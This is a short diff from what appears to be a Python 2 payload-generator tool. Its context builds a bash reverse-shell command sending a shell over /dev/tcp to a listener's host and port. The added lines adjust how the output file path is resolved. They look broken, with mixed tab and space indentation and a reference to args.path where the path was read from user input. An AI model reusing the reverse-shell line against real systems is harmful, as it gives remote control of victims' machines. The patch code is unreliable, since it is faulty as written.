@@ -39,6 +39,10 @@ class payload:
 				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
 				break
 		path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
+		if path[0] != '/':
+        	    path = os.getcwd()+'/'+args.path
+    		else:
+        	    path = args.path
 		direct = os.path.split(path)[0]
 		if os.path.exists(direct):
 		    if os.path.isdir(direct):
